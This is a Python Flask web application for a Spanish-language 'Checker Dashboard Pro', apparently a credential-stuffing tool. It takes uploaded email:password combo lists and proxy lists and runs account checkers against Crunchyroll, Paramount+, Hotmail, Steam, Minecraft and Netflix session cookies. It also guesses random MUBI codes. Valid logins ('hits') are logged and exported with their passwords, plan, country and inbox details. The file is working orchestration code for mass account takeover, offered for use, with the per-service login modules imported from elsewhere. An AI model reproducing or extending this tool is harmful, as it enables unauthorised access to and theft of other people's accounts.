# app.py - CHECKER DASHBOARD UNIFICADO
import os
import sys
import asyncio
import threading
import time
import json
import re
import random
import base64
import uuid
from datetime import datetime
from pathlib import Path
from flask import Flask, render_template_string, request, jsonify, send_file
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# IMPORTAR CHECKERS
# ============================================
from checkers import (
    CrunchyrollChecker,
    CrunchyrollCheckerV2,
    ParamountChecker,
    HotmailChecker,
    MubiChecker,
    SteamChecker,
    MinecraftChecker,
    NetflixChecker
)

# ============================================
# CONFIGURACIÓN FLASK
# ============================================
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
app.config['SECRET_KEY'] = 'checker-dashboard-secret-key'

# ============================================
# DIRECTORIOS
# ============================================
BASE_DIR = Path(__file__).parent
RESULTS_DIR = BASE_DIR / "results"
HITS_DIR = RESULTS_DIR / "hits"
LOGS_DIR = RESULTS_DIR / "logs"
UPLOADS_DIR = BASE_DIR / "uploads"

for d in [RESULTS_DIR, HITS_DIR, LOGS_DIR, UPLOADS_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# ============================================
# VARIABLES GLOBALES
# ============================================
uploaded_accounts = []
uploaded_proxies = []
current_checker_type = 'crunchyroll'

checker_status = {
    'running': False,
    'checker': None,
    'total': 0,
    'processed': 0,
    'hits': 0,
    'errors': 0,
    'invalid': 0,
    'logs': [],
    'results': [],
    'start_time': None,
    'elapsed': 0
}

checker_thread = None
stop_event = threading.Event()
current_hits = []

# ============================================
# UTILS
# ============================================
def load_accounts_from_text(content):
    """Carga cuentas desde texto"""
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        # Probar diferentes separadores
        for sep in [':', '|', ';', ',', '\t']:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2 and '@' in parts[0]:
                    email = parts[0].strip()
                    password = parts[1].strip()
                    if email and password:
                        accounts.append((email, password))
                        break
    return accounts

def load_cookies_from_text(content):
    """Carga cookies desde texto (para Netflix)"""
    cookies = []
    # Si es un archivo de cookies, lo guardamos como un solo item
    if 'NetflixId' in content or 'SecureNetflixId' in content:
        cookies.append(content.strip())
    return cookies

def load_proxies_from_text(content):
    """Carga proxies desde texto"""
    proxies = []
    for line in content.splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            proxies.append(line)
    return proxies

def format_proxy(proxy):
    """Formatea proxy para requests"""
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    if '@' in proxy:
        return f"http://{proxy}"
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{proxy}"
    return None

# ============================================
# FUNCIONES DE CHECKER
# ============================================
def run_checker_thread(checker_type, accounts, proxies, stop_event):
    """Ejecuta el checker seleccionado en un thread"""
    global checker_status, current_hits
    
    total = len(accounts)
    checker_status['total'] = total
    checker_status['processed'] = 0
    checker_status['hits'] = 0
    checker_status['errors'] = 0
    checker_status['invalid'] = 0
    checker_status['logs'] = []
    checker_status['results'] = []
    current_hits = []
    checker_status['start_time'] = time.time()
    checker_status['checker'] = checker_type
    
    # Mapeo de checkers
    checker_map = {
        'crunchyroll': run_crunchyroll_checker,
        'crunchyroll_v2': run_crunchyroll_v2_checker,
        'paramount': run_paramount_checker,
        'hotmail': run_hotmail_checker,
        'steam': run_steam_checker,
        'minecraft': run_minecraft_checker,
        'netflix': run_netflix_checker,
        'mubi': run_mubi_checker
    }
    
    if checker_type in checker_map:
        checker_map[checker_type](accounts, proxies, stop_event)
    else:
        checker_status['logs'].append(f"[ERROR] Checker {checker_type} no encontrado")
        checker_status['running'] = False

def run_crunchyroll_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Crunchyroll (versión asíncrona)"""
    global checker_status, current_hits
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def process_accounts():
        sem = asyncio.Semaphore(50)
        tasks = []
        
        for i, (email, password) in enumerate(accounts):
            if stop_event.is_set():
                break
            
            proxy = None
            if proxies:
                proxy = random.choice(proxies)
            
            tasks.append(process_single_crunchyroll(email, password, proxy, sem, i))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def process_single_crunchyroll(email, password, proxy, sem, index):
        global checker_status, current_hits
        
        async with sem:
            if stop_event.is_set():
                return
            
            try:
                result = await CrunchyrollChecker.check(email, password, proxy)
                
                checker_status['processed'] += 1
                
                if result.get('status') == 'HIT':
                    checker_status['hits'] += 1
                    current_hits.append(result)
                    checker_status['results'].append(result)
                    log_msg = f"[HIT] {email} | {result.get('plan', 'Unknown')} | {result.get('country', 'Unknown')}"
                    checker_status['logs'].append(log_msg)
                    
                    hit_file = HITS_DIR / f"crunchyroll_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(hit_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password} | {result.get('plan', 'Unknown')} | {result.get('country', 'Unknown')}\n")
                
                elif result.get('status') == 'FREE':
                    log_msg = f"[FREE] {email}"
                    checker_status['logs'].append(log_msg)
                
                elif result.get('status') == 'CUSTOM':
                    checker_status['hits'] += 1
                    current_hits.append(result)
                    checker_status['results'].append(result)
                    log_msg = f"[CUSTOM] {email} | {result.get('plan', 'Unknown')}"
                    checker_status['logs'].append(log_msg)
                
                elif result.get('status') == 'INVALID':
                    checker_status['invalid'] += 1
                    log_msg = f"[INVALID] {email}"
                    checker_status['logs'].append(log_msg)
                
                else:
                    checker_status['errors'] += 1
                    log_msg = f"[ERROR] {email} | {result.get('error', 'Unknown error')}"
                    checker_status['logs'].append(log_msg)
                
                if len(checker_status['logs']) > 200:
                    checker_status['logs'] = checker_status['logs'][-200:]
                
                checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
                
            except Exception as e:
                checker_status['errors'] += 1
                checker_status['logs'].append(f"[ERROR] {email} | {str(e)}")
    
    try:
        loop.run_until_complete(process_accounts())
    except Exception as e:
        checker_status['logs'].append(f"[FATAL] {str(e)}")
    finally:
        loop.close()
        checker_status['running'] = False
        checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
        checker_status['logs'].append("[INFO] Checker finalizado")

def run_crunchyroll_v2_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Crunchyroll (versión con threads)"""
    global checker_status, current_hits
    
    results, stats = CrunchyrollCheckerV2.process_batch(accounts, proxies, threads=10)
    
    checker_status['processed'] = stats.get('total', 0)
    checker_status['hits'] = stats.get('hit', 0)
    checker_status['invalid'] = stats.get('bad', 0)
    checker_status['errors'] = stats.get('error', 0)
    checker_status['results'] = results
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

def run_paramount_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Paramount+"""
    global checker_status, current_hits
    
    for i, (email, password) in enumerate(accounts):
        if stop_event.is_set():
            break
        
        proxy = None
        if proxies:
            proxy = random.choice(proxies)
        
        try:
            result = ParamountChecker.check(email, password, proxy)
            
            checker_status['processed'] += 1
            
            if result.get('status') == 'HIT':
                checker_status['hits'] += 1
                current_hits.append(result)
                checker_status['results'].append(result)
                log_msg = f"[HIT] {email} | {result.get('plan', 'Unknown')} | {result.get('country', 'Unknown')}"
                checker_status['logs'].append(log_msg)
                
                hit_file = HITS_DIR / f"paramount_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(hit_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | {result.get('plan', 'Unknown')} | {result.get('country', 'Unknown')}\n")
            
            elif result.get('status') == 'FREE':
                log_msg = f"[FREE] {email}"
                checker_status['logs'].append(log_msg)
            
            elif result.get('status') == 'INVALID':
                checker_status['invalid'] += 1
                log_msg = f"[INVALID] {email}"
                checker_status['logs'].append(log_msg)
            
            else:
                checker_status['errors'] += 1
                log_msg = f"[ERROR] {email} | {result.get('error', 'Unknown error')}"
                checker_status['logs'].append(log_msg)
            
            if len(checker_status['logs']) > 200:
                checker_status['logs'] = checker_status['logs'][-200:]
            
            checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
            
        except Exception as e:
            checker_status['errors'] += 1
            checker_status['logs'].append(f"[ERROR] {email} | {str(e)}")
    
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

def run_hotmail_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Hotmail con threads"""
    global checker_status, current_hits
    
    results, stats = HotmailChecker.process_batch(accounts, proxies, threads=10)
    
    for result in results:
        if result.get('status') == 'HIT':
            current_hits.append(result)
            checker_status['results'].append(result)
            checker_status['hits'] += 1
            log_msg = f"[HIT] {result.get('email')} | {result.get('country', 'Unknown')}"
            if result.get('inbox_count', 0) > 0:
                log_msg += f" | Inbox: {result.get('inbox_count')} emails"
            checker_status['logs'].append(log_msg)
        elif result.get('status') == '2FA':
            checker_status['invalid'] += 1
            checker_status['logs'].append(f"[2FA] {result.get('email')}")
        elif result.get('status') == 'INVALID':
            checker_status['invalid'] += 1
            checker_status['logs'].append(f"[INVALID] {result.get('email')}")
        else:
            checker_status['errors'] += 1
            checker_status['logs'].append(f"[ERROR] {result.get('email')} | {result.get('error', 'Unknown error')}")
    
    checker_status['processed'] = stats.get('total', 0)
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

def run_steam_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Steam"""
    global checker_status, current_hits
    
    results, stats = SteamChecker.process_batch(accounts, proxies, threads=10)
    
    for result in results:
        if result.get('status') == 'HIT':
            current_hits.append(result)
            checker_status['results'].append(result)
            checker_status['hits'] += 1
            log_msg = f"[HIT] {result.get('email')} | SteamID: {result.get('steam_id')} | Level: {result.get('level', '?')} | Games: {result.get('games', 0)}"
            checker_status['logs'].append(log_msg)
        elif result.get('status') == '2FA':
            checker_status['logs'].append(f"[2FA] {result.get('email')}")
        elif result.get('status') == 'BANNED':
            checker_status['invalid'] += 1
            checker_status['logs'].append(f"[BAN] {result.get('email')}")
        elif result.get('status') == 'INVALID':
            checker_status['invalid'] += 1
            checker_status['logs'].append(f"[INVALID] {result.get('email')}")
        else:
            checker_status['errors'] += 1
            checker_status['logs'].append(f"[ERROR] {result.get('email')} | {result.get('error', 'Unknown error')}")
    
    checker_status['processed'] = stats.get('total', 0)
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

def run_minecraft_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Minecraft"""
    global checker_status, current_hits
    
    results, stats = MinecraftChecker.process_batch(accounts, proxies, threads=10)
    
    for result in results:
        if result.get('status') == 'HIT':
            current_hits.append(result)
            checker_status['results'].append(result)
            checker_status['hits'] += 1
            log_msg = f"[HIT] {result.get('email')}"
            if result.get('name'):
                log_msg += f" | {result.get('name')}"
            if result.get('country'):
                log_msg += f" | {result.get('country')}"
            checker_status['logs'].append(log_msg)
        elif result.get('status') == '2FA':
            checker_status['logs'].append(f"[2FA] {result.get('email')}")
        elif result.get('status') == 'INVALID':
            checker_status['invalid'] += 1
            checker_status['logs'].append(f"[INVALID] {result.get('email')}")
        else:
            checker_status['errors'] += 1
            checker_status['logs'].append(f"[ERROR] {result.get('email')} | {result.get('error', 'Unknown error')}")
    
    checker_status['processed'] = stats.get('total', 0)
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

def run_netflix_checker(accounts, proxies, stop_event):
    """Ejecuta checker de Netflix (cookies)"""
    global checker_status, current_hits
    
    # Para Netflix, cada "cuenta" es un texto de cookies
    cookie_files = accounts
    
    results, stats = NetflixChecker.process_batch(cookie_files, proxies, threads=5)
    
    for result in results:
        if result.get('status') == 'HIT':
            current_hits.append(result)
            checker_status['results'].append(result)
            checker_status['hits'] += 1
            log_msg = f"[HIT] {result.get('email', 'Unknown')} | {result.get('plan', 'Unknown')} | {result.get('country', 'Unknown')}"
            checker_status['logs'].append(log_msg)
        elif result.get('status') == 'INVALID':
            checker_status['invalid'] += 1
            checker_status['logs'].append(f"[INVALID] {result.get('source', 'Unknown')}")
        else:
            checker_status['errors'] += 1
            checker_status['logs'].append(f"[ERROR] {result.get('source', 'Unknown')} | {result.get('error', 'Unknown error')}")
    
    checker_status['processed'] = stats.get('total', 0)
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

def run_mubi_checker(accounts, proxies, stop_event):
    """Ejecuta checker de MUBI (genera códigos)"""
    global checker_status, current_hits
    
    # MUBI genera sus propios códigos, no usa accounts
    results, stats = MubiChecker.process_batch(accounts, proxies, threads=10)
    
    for result in results:
        if result.get('status') == 'HIT':
            current_hits.append(result)
            checker_status['results'].append(result)
            checker_status['hits'] += 1
            log_msg = f"[HIT] {result.get('code')} | {result.get('type', 'Unknown')} | Days: {result.get('days', '?')}"
            checker_status['logs'].append(log_msg)
        elif result.get('status') == 'BAD':
            checker_status['invalid'] += 1
            # No logueamos BAD para no llenar logs
        else:
            checker_status['errors'] += 1
            checker_status['logs'].append(f"[ERROR] {result.get('code')} | {result.get('error', 'Unknown error')}")
    
    checker_status['processed'] = stats.get('total', 0)
    checker_status['running'] = False
    checker_status['elapsed'] = int(time.time() - checker_status['start_time'])
    checker_status['logs'].append("[INFO] Checker finalizado")

# ============================================
# RUTAS FLASK
# ============================================

@app.route('/')
def index():
    """Página principal"""
    # Renderizar el HTML embebido
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    """Health check para Render"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Sube archivo de cuentas o proxies"""
    global uploaded_accounts, uploaded_proxies
    
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400
        
        content = file.read().decode('utf-8', errors='ignore')
        
        file_type = request.form.get('type', 'accounts')
        
        if file_type == 'accounts':
            # Intentar cargar como cuentas (email:password)
            accounts = load_accounts_from_text(content)
            
            # Si no hay cuentas, intentar como cookies (Netflix)
            if not accounts:
                cookies = load_cookies_from_text(content)
                if cookies:
                    uploaded_accounts = cookies
                    return jsonify({
                        'success': True,
                        'count': len(cookies),
                        'type': 'cookies',
                        'content': content,
                        'preview': cookies[:5]
                    })
                else:
                    return jsonify({'error': 'No valid accounts or cookies found'}), 400
            
            uploaded_accounts = accounts
            
            return jsonify({
                'success': True,
                'count': len(accounts),
                'type': 'accounts',
                'content': content,
                'preview': accounts[:5]
            })
        else:
            proxies = load_proxies_from_text(content)
            uploaded_proxies = proxies
            return jsonify({
                'success': True,
                'count': len(proxies),
                'type': 'proxies',
                'content': content,
                'preview': proxies[:5]
            })
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/start', methods=['POST'])
def start_checker():
    """Inicia el checker seleccionado"""
    global checker_status, checker_thread, stop_event, current_hits, uploaded_accounts, uploaded_proxies, current_checker_type
    
    if checker_status['running']:
        return jsonify({'error': 'Checker ya está en ejecución'}), 400
    
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    checker_type = data.get('checker')
    content = data.get('content', '')
    proxies_content = data.get('proxies', '')
    
    current_checker_type = checker_type
    
    # Procesar cuentas según el checker
    accounts = []
    proxies = []
    
    # Cargar proxies si hay
    if proxies_content:
        proxies = load_proxies_from_text(proxies_content)
    
    # Para MUBI, generamos códigos automáticamente (1000 por defecto)
    if checker_type == 'mubi':
        import string
        accounts = [''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(1000)]
    else:
        # Para los demás, cargar cuentas
        if content:
            # Intentar como cuentas normales
            accounts = load_accounts_from_text(content)
            
            # Si no hay, intentar como cookies (Netflix)
            if not accounts and 'NetflixId' in content:
                accounts = [content.strip()]
        
        if not accounts:
            return jsonify({'error': 'No hay cuentas válidas'}), 400
    
    # Mapeo de checkers
    checker_map = {
        'crunchyroll': run_crunchyroll_checker,
        'crunchyroll_v2': run_crunchyroll_v2_checker,
        'paramount': run_paramount_checker,
        'hotmail': run_hotmail_checker,
        'steam': run_steam_checker,
        'minecraft': run_minecraft_checker,
        'netflix': run_netflix_checker,
        'mubi': run_mubi_checker
    }
    
    if checker_type not in checker_map:
        return jsonify({'error': f'Checker {checker_type} no válido'}), 400
    
    # Resetear estado
    stop_event.clear()
    current_hits = []
    checker_status['running'] = True
    checker_status['checker'] = checker_type
    checker_status['logs'] = []
    checker_status['results'] = []
    checker_status['total'] = len(accounts)
    checker_status['processed'] = 0
    checker_status['hits'] = 0
    checker_status['errors'] = 0
    checker_status['invalid'] = 0
    checker_status['start_time'] = time.time()
    checker_status['elapsed'] = 0
    
    # Iniciar thread
    checker_thread = threading.Thread(
        target=run_checker_thread,
        args=(checker_type, accounts, proxies, stop_event),
        daemon=True
    )
    checker_thread.start()
    
    return jsonify({
        'success': True,
        'message': f'Checker {checker_type} iniciado',
        'total': len(accounts)
    })

@app.route('/api/stop', methods=['POST'])
def stop_checker():
    """Detiene el checker en ejecución"""
    global stop_event
    
    if not checker_status['running']:
        return jsonify({'error': 'No hay checker en ejecución'}), 400
    
    stop_event.set()
    checker_status['running'] = False
    checker_status['logs'].append("[INFO] ⏹ Checker detenido por usuario")
    
    return jsonify({'success': True, 'message': 'Checker detenido'})

@app.route('/api/status')
def get_status():
    """Obtiene el estado actual del checker"""
    return jsonify({
        'running': checker_status['running'],
        'checker': checker_status['checker'],
        'total': checker_status['total'],
        'processed': checker_status['processed'],
        'hits': checker_status['hits'],
        'errors': checker_status['errors'],
        'invalid': checker_status['invalid'],
        'logs': checker_status['logs'][-50:],
        'results': checker_status['results'][-20:],
        'elapsed': checker_status['elapsed'],
        'start_time': checker_status['start_time']
    })

@app.route('/api/export')
def export_hits():
    """Exporta los hits como archivo de texto"""
    global current_hits
    
    if not current_hits:
        return jsonify({'error': 'No hay hits para exportar'}), 400
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"hits_export_{timestamp}.txt"
    filepath = HITS_DIR / filename
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("=" * 70 + "\n")
        f.write("🏆 HITS EXPORT\n")
        f.write(f"📅 Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"📊 Total: {len(current_hits)}\n")
        f.write("=" * 70 + "\n\n")
        
        for i, hit in enumerate(current_hits, 1):
            email = hit.get('email', hit.get('code', 'Unknown'))
            password = hit.get('password', '')
            country = hit.get('country', '')
            plan = hit.get('plan', hit.get('type', hit.get('tipo', 'Unknown')))
            
            f.write(f"#{i}\n")
            f.write(f"📧 Email/Código: {email}\n")
            if password:
                f.write(f"🔑 Password: {password}\n")
            if country:
                f.write(f"🌍 País: {country}\n")
            f.write(f"📡 Plan/Tipo: {plan}\n")
            
            # Campos adicionales
            if hit.get('steam_id'):
                f.write(f"🆔 SteamID: {hit.get('steam_id')}\n")
            if hit.get('level'):
                f.write(f"📊 Nivel: {hit.get('level')}\n")
            if hit.get('games'):
                f.write(f"🎮 Juegos: {hit.get('games')}\n")
            if hit.get('inbox_count'):
                f.write(f"📨 Inbox: {hit.get('inbox_count')} emails\n")
            if hit.get('expires'):
                f.write(f"📅 Expira: {hit.get('expires')}\n")
            if hit.get('profiles'):
                f.write(f"👥 Perfiles: {', '.join(hit.get('profiles', []))}\n")
            
            f.write("-" * 50 + "\n\n")
    
    return send_file(filepath, as_attachment=True, download_name=filename)

@app.route('/api/clear_logs', methods=['POST'])
def clear_logs():
    """Limpia los logs"""
    checker_status['logs'] = []
    return jsonify({'success': True})

@app.route('/api/clear_hits', methods=['POST'])
def clear_hits():
    """Limpia los hits"""
    global current_hits
    current_hits = []
    checker_status['results'] = []
    return jsonify({'success': True})

# ============================================
# HTML TEMPLATE (EMBEBIDO)
# ============================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checker Dashboard Pro</title>
    <style>
        /* ===== RESET ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0f;
            color: #ffffff;
            min-height: 100vh;
        }
        
        /* ===== SCROLLBAR ===== */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #15161a; border-radius: 3px; }
        ::-webkit-scrollbar-thumb { background: #E4751E; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #c9651a; }
        
        /* ===== HEADER ===== */
        .header {
            background: #15161a;
            border-bottom: 2px solid #E4751E;
            padding: 12px 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header-logo { font-size: 28px; }
        .header-title {
            font-size: 18px;
            font-weight: bold;
            color: #E4751E;
        }
        .header-subtitle {
            color: #8a8c9e;
            font-size: 12px;
        }
        .header-right {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .header-badge {
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
        }
        .badge-stopped { background: #ff4444; color: #fff; }
        .badge-running { background: #00cc88; color: #0a0a0f; animation: pulse-badge 1.5s infinite; }
        .badge-waiting { background: #ffaa44; color: #0a0a0f; }
        .badge-done { background: #E4751E; color: #fff; }
        
        @keyframes pulse-badge {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        
        /* ===== MAIN LAYOUT ===== */
        .main {
            max-width: 1500px;
            margin: 0 auto;
            padding: 15px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        @media (max-width: 950px) {
            .main { grid-template-columns: 1fr; }
        }
        
        /* ===== CARDS ===== */
        .card {
            background: #15161a;
            border: 1px solid #2a2b35;
            border-radius: 12px;
            padding: 16px;
        }
        .card-title {
            font-size: 13px;
            font-weight: bold;
            color: #E4751E;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 8px;
        }
        .card-title .badge {
            font-size: 10px;
            font-weight: normal;
            color: #8a8c9e;
            background: #0a0a0f;
            padding: 2px 10px;
            border-radius: 12px;
        }
        
        /* ===== FORMULARIOS ===== */
        .form-group {
            margin-bottom: 10px;
        }
        .form-group label {
            display: block;
            font-size: 11px;
            color: #8a8c9e;
            margin-bottom: 3px;
        }
        .form-group input {
            width: 100%;
            padding: 8px 12px;
            background: #0a0a0f;
            border: 1px solid #2a2b35;
            border-radius: 6px;
            color: #fff;
            font-size: 13px;
            transition: border 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #E4751E;
        }
        .form-group input[type="file"] {
            padding: 6px;
            cursor: pointer;
        }
        .form-group input[type="file"]::file-selector-button {
            background: #E4751E;
            border: none;
            color: #fff;
            padding: 5px 14px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
        }
        .form-group input[type="file"]::file-selector-button:hover {
            background: #c9651a;
        }
        
        /* ===== CHECKER SELECTOR ===== */
        .checker-selector {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin-bottom: 12px;
        }
        @media (max-width: 600px) {
            .checker-selector { grid-template-columns: repeat(2, 1fr); }
        }
        .checker-option {
            padding: 10px;
            background: #0a0a0f;
            border: 2px solid #2a2b35;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        .checker-option:hover { border-color: #E4751E66; }
        .checker-option.active {
            border-color: #E4751E;
            background: #E4751E15;
        }
        .checker-option .icon { font-size: 24px; }
        .checker-option .name { font-size: 11px; font-weight: bold; margin-top: 3px; }
        .checker-option .desc { font-size: 9px; color: #8a8c9e; }
        .checker-option .status-dot {
            display: inline-block;
            width: 7px;
            height: 7px;
            border-radius: 50%;
            margin-top: 3px;
        }
        .dot-idle { background: #555; }
        .dot-running { background: #00cc88; animation: pulse-dot 1s infinite; }
        .dot-done { background: #ffaa44; }
        
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* ===== BOTONES ===== */
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-primary { background: #E4751E; color: #fff; }
        .btn-primary:hover { background: #c9651a; transform: translateY(-1px); }
        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
        
        .btn-danger { background: #ff4444; color: #fff; }
        .btn-danger:hover { background: #cc0000; }
        .btn-danger:disabled { opacity: 0.4; cursor: not-allowed; }
        
        .btn-success { background: #00cc88; color: #0a0a0f; }
        .btn-success:hover { background: #00aa77; }
        .btn-success:disabled { opacity: 0.4; cursor: not-allowed; }
        
        .btn-secondary { background: #2a2b35; color: #fff; }
        .btn-secondary:hover { background: #3a3b45; }
        
        .btn-group {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            margin-top: 8px;
        }
        
        /* ===== ESTADÍSTICAS ===== */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
            gap: 6px;
            margin-bottom: 10px;
        }
        .stat-item {
            background: #0a0a0f;
            border-radius: 6px;
            padding: 8px;
            text-align: center;
        }
        .stat-value {
            font-size: 18px;
            font-weight: bold;
            color: #E4751E;
        }
        .stat-label {
            font-size: 9px;
            color: #8a8c9e;
            margin-top: 2px;
        }
        .stat-hit { color: #00ff88; }
        .stat-error { color: #ff4444; }
        .stat-invalid { color: #ffaa44; }
        .stat-total { color: #E4751E; }
        
        /* ===== PROGRESO ===== */
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #2a2b35;
            border-radius: 3px;
            overflow: hidden;
            margin: 6px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #E4751E, #ff9a44);
            border-radius: 3px;
            transition: width 0.5s;
            width: 0%;
        }
        .progress-text {
            font-size: 11px;
            color: #8a8c9e;
            text-align: right;
        }
        
        /* ===== LOGS ===== */
        .log-container {
            background: #0a0a0f;
            border-radius: 6px;
            padding: 8px;
            max-height: 250px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            line-height: 1.4;
        }
        .log-line { padding: 2px 0; border-bottom: 1px solid #0f0f14; }
        .log-hit { color: #00ff88; }
        .log-free { color: #8a8c9e; }
        .log-invalid { color: #ffaa44; }
        .log-error { color: #ff4444; }
        .log-info { color: #E4751E; }
        .log-2fa { color: #ff8800; }
        .log-custom { color: #cc88ff; }
        .log-ban { color: #ff0066; }
        
        /* ===== HITS ===== */
        .hits-container {
            background: #0a0a0f;
            border-radius: 6px;
            padding: 8px;
            max-height: 250px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 10px;
        }
        .hit-item {
            padding: 3px 6px;
            border-bottom: 1px solid #0f0f14;
            color: #00ff88;
        }
        .hit-item .badge-plan {
            background: #E4751E33;
            padding: 1px 6px;
            border-radius: 8px;
            font-size: 9px;
            color: #E4751E;
        }
        
        /* ===== UPLOAD STATUS ===== */
        .upload-status {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 11px;
            margin-top: 3px;
            display: none;
        }
        .upload-success { background: #00cc8822; color: #00cc88; border: 1px solid #00cc8844; display: block; }
        .upload-error { background: #ff444422; color: #ff4444; border: 1px solid #ff444444; display: block; }
        .upload-waiting { background: #ffaa4422; color: #ffaa44; border: 1px solid #ffaa4444; display: block; }
        
        /* ===== STATUS INDICATOR ===== */
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            background: #0a0a0f;
            border-radius: 6px;
        }
        .status-indicator .led {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }
        .led-red { background: #ff4444; }
        .led-green { background: #00cc88; animation: pulse-dot 1s infinite; }
        .led-yellow { background: #ffaa44; }
        
        /* ===== TIMER ===== */
        .timer-display {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #E4751E;
            font-weight: bold;
        }
        
        /* ===== EMPTY STATE ===== */
        .empty-state {
            text-align: center;
            padding: 20px;
            color: #8a8c9e;
        }
        .empty-state .icon { font-size: 30px; }
        .empty-state .text { font-size: 12px; margin-top: 5px; }
        
        /* ===== RESPONSIVE ===== */
        @media (max-width: 600px) {
            .header-title { font-size: 14px; }
            .header-subtitle { font-size: 10px; }
            .stats-grid { grid-template-columns: repeat(3, 1fr); }
            .btn { padding: 6px 12px; font-size: 11px; }
            .checker-option { padding: 6px; }
            .checker-option .icon { font-size: 18px; }
            .checker-option .name { font-size: 9px; }
        }
    </style>
</head>
<body>
    <!-- ===== HEADER ===== -->
    <header class="header">
        <div class="header-left">
            <span class="header-logo">🚀</span>
            <div>
                <div class="header-title">Checker Dashboard Pro</div>
                <div class="header-subtitle">Multi-Checker Unificado v3.0</div>
            </div>
        </div>
        <div class="header-right">
            <div class="status-indicator">
                <span class="led led-red" id="statusLed"></span>
                <span id="statusText" style="font-size:12px;font-weight:bold;color:#ff4444;">Detenido</span>
            </div>
            <span class="timer-display" id="timerDisplay">00:00:00</span>
        </div>
